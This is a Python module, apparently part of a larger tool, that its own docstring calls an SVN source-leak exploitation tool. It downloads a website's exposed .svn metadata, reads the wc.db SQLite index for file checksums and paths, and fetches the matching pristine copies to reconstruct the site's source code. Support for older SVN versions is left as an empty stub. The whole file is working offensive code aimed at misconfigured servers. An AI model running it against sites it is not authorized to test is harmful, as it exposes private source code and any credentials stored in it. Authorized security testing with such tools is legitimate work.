#!/usr/bin/env python3
# -*- coding=utf-8 -*-

"""
SVN源代码泄露利用工具
"""

import re
import sqlite3
import click
from aiomultiprocess import Pool
from ..dumper import BasicDumper


class Dumper(BasicDumper):
    """ .svn Dumper """

    def __init__(self, url: str, outdir: str, force=False):
        super(Dumper, self).__init__(url, outdir, force)
        self.base_url = re.sub(".svn.*", ".svn", url)

    async def start(self):
        """ dumper入口方法 """
        entries_url = self.base_url + "/entries"
        status, data = await self.fetch(entries_url)
        if not data:
            click.secho("Failed [%s] %s" % (status, entries_url), fg="red")
            return
        if data == b"12\n":
            await self.dump()
        else:
            # TODO: 针对svn1.7以前的版本
            click.secho("DUMP LEGACY", fg="yellow")
            await self.dump_legacy()

    async def dump(self):
        """ 针对svn1.7以后的版本 """
        # 创建一个临时文件用来存储wc.db
        idxfile = await self.indexfile(self.base_url + "/wc.db")
        # 从wc.db中解析URL和文件名
        for item in self.parse(idxfile.name):
            sha1, filename = item
            if not sha1 or not filename:
                continue
            # sha1: $sha1$82e5777817f98354c205006bf7b68ffba018c1ec
            url = "%s/pristine/%s/%s.svn-base" % (self.base_url, sha1[6:8], sha1[6:])
            if not self.force and not await self.checkit(url, filename):
                exit()
            self.targets.append((url, filename))
        idxfile.close()
        # 创建进程池，调用download
        async with Pool() as pool:
            await pool.map(self.download, self.targets)

    async def dump_legacy(self):
        """ 针对svn1.7以前的版本 """
        pass

    def parse(self, filename: str) -> list:
        """ sqlite解析wc.db并返回一个(hash, name)组成列表 """
        try:
            conn = sqlite3.connect(filename)
            cursor = conn.cursor()
            cursor.execute("select checksum, local_relpath from NODES")
            items = cursor.fetchall()
            conn.close()
            return items
        except Exception as e:
            click.secho("Sqlite connection failed.", fg="red")
            click.secho(str(e.args), fg="red")
            return []
